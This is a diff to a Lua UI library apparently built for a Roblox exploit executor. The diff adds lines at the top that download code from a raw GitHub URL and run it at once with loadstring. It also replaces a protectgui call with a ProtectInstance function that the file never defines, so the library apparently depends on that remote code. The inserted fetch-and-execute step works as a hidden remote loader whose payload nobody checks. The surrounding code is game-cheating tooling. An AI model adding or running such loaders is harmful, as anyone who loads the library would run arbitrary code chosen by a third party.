@@ -1,3 +1,6 @@
+local request = request or http_request or (http and http.request)
+loadstring(request({Url="https://raw.githubusercontent.com/p00pd4wg/cod/refs/heads/main/protection",Method="GET"}).Body)()
+
 --Services
 getgenv().runService = cloneref(game:GetService("RunService"))
 getgenv().textService = cloneref(game:GetService("TextService"))
@@ -2479,12 +2482,7 @@ function library:Init()
 	self.hasInit = true
 
 	self.base = library:Create("ScreenGui", {IgnoreGuiInset = true, ZIndexBehavior = Enum.ZIndexBehavior.Global})
-	if protectgui then
-		protectgui(self.base)
-		self.base.Parent = cloneref(game:GetService("CoreGui"))
-	else
-		self.base.Parent = cloneref(game:GetService("CoreGui"))
-	end
+	ProtectInstance(self.base)
 
 	self.main = self:Create("ImageButton", {
 		AutoButtonColor = false,
